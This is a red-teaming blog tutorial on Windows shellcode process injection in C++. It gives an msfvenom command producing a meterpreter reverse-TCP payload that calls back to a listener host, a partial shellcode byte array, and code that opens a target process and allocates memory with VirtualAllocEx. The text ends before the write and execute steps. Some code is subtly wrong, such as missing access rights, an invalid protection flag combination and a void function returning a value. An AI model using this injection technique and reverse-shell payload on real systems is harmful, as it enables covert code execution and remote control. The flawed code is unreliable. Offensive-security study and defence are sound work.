---
title: Offensive C++ - Process Injection (ShellCode)
author: nirajkharel
date: 2024-06-27 15:10:00 +0800
categories: [Red Teaming, Offensive Programming]
tags: [Red Teaming, Offensive Programming]
render_with_liquid: false
---


## Process Injection - Shellcode

In this blog, we are going to discuss how we can perform a generic shellcode injection inside a running process and the functions needed to do it.

Generally, shellcode injection in a process refers to injecting portable executable (PE) code into the virtual address space of the running process and then executing it via a new thread. It can also be a potential technique to avoid detection and gain the elevated privileges of the running process. The flowchart below describes the process that should be followed during the injection. The general process consists of:
- Identifying the running process
- Obtaining the handle to the process
- Allocating the buffer in the virtual address space of the process
- Creating and writing the shellcode into the allocated buffer
- Creating a thread that runs in the virtual address space of the process, aka executing the shellcode

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/proc-injection-shellcode.png">


**Creating a Shellcode**    
We can use msfvenom to generate a generic reverse shell shellcode using below command.
```bash
msfvenom -platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=4444 -f c --var-name=wannabe

unsigned char wannabe[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
.............[snip]......
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5";
```

**Enumerating the Running Process**
We have previously discussed the enumeration of processes and their entities such as process IDs and process names in previous blogs. You can refer to this link for more information on the **[ToolHelp32](https://nirajkharel.com.np/posts/process-enumeration-toolhelp32/)** function. Process enumeration can also be achieved using other methods like the **[Windows Terminal Services API](https://nirajkharel.com.np/posts/process-enumeration-windows-terminal-services/)**, **[EnumProcess](https://nirajkharel.com.np/posts/process-enumeration-enum-process/)**, or **[NtQuerySystemInformation](https://nirajkharel.com.np/posts/process-enumeration-ntqueryinformation/)**.

Define the function for process Id enumeration and call it within the **main** function.
```c++
void FindProcess() {
    // Your Code here
}

int main(){
    FindProcess();

    // Provide the Proces Ids and take an input from the user for the process they want to enumerate the modules for.
    DWORD pid;
    cout << "\n\nEnter ProcessId: ";
    cin >> pid;
    
    // Pass the Process Id to FindProcessModule
    InjectShellcode(pid);
}
```

Once we have enumerate the running processes and the process Ids associated with them, we need to open the handle to the proccess that we want to inject our code. Here I have described the impelementation of the [**Open Process**](https://nirajkharel.com.np/posts/process-module-enumeration/#openprocess) function.
```c++
void InjectShellcode(DWORD pid) {

    // shellcode
    unsigned char wannabe[] = "\xfc ...[snip]...\xd5";

    // Needed parameters for OpenProcess
    HANDLE hProcess;
    BOOL bInHandle;
    DWORD dwProcessId = pid;

    // Opening the handle of the process. PROCESS_QUERY_INFORMATION and PROCESS_VM_READ is needed for GetModuleFileNameEx function
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessId);

    if (hProcess == NULL){
        cout << "\nUnable to Identify the Process ID\n";
        return;
    }
``` 

**Buffer Allocation -** [**VirtualAllocEx**](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)

As we discussed earlier, we need to allocate our buffer into the virtual address space of the running process. Before that, we need to allocate/reserve the region of the memory within the virtual address space. This can be done using VirtualAllocEx function of the windows API

**SYNTAX**
```c++
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

The `VirtualAllocEx` function returns the base address of the allocated memory region if it succeeds and returns `NULL` if it fails.
- **HANDLE hProcess**: Contains the handle to the process where the allocation needs to occur. For successful execution, the handle must have the `PROCESS_VM_OPERATION` access right. Therefore, while using the **OpenProcess** function, this right needs to be defined already.
- **LPVOID lpAddress**: An optional parameter that defines the starting address of the allocation within the virtual address space. It can be set to `NULL` to allow the program to determine the allocation region automatically.
- **SIZE_T dwSize**: Contains the size of the allocated region that we need to allocate. This means the size of our shellcode.
- **DWORD flAllocationType**: Contains the type of memory allocation that we need to define. Microsoft has provided a list of such types depending on the requirements. As we are reserving the region of the virtual address and then committing our shellcode, to do that in a single step, it is recommended to use `MEM_COMMIT | MEM_RESERVE`. There are additional types like `MEM_RESET`, `MEM_RESET_UNDO`, `MEM_LARGE_PAGES`, `MEM_PHYSICAL`, and `MEM_TOP_DOWN` if you would like to explore.
- **DWORD flProtect**: Contains the memory protection constants defined by Microsoft. We will be using `PAGE_READWRITE` and `PAGE_EXECUTE` values for it since we need to allocate the memory region, write into that region, and execute the shellcode. You can explore other [constants here.](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants)

Once we are ready with the function and its parameters, let's define it inside our `InjectShellcode` function.
 

```c++

    // Define the neede parameters.
    LPVOID lpAddress = NULL; // NULL to instruct program to figure out the starting region by themselves
    SIZE_T dwSize = sizeof(wannabe); // Size of the shellcode
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE; // Reserve and commit in sigle step 
    DWORD flProtect = PAGE_READWRITE | PAGE_EXECUTE; // Necessary permission to write and execute the shellcode

// Define the function VirtualAllocEx
    LPVOID lpBuffer = VirtualAllocEx(hProcess, 
    lpAddress, dwSize, flAllocationType, flProtect);
  	if (lpBuffer == NULL){
  		printf("\nFailed to Allocate the memory\n");
  		CloseHandle(hProcess);
  		return 1;
  	}
    printf("Allocated the memory into virtual space");
```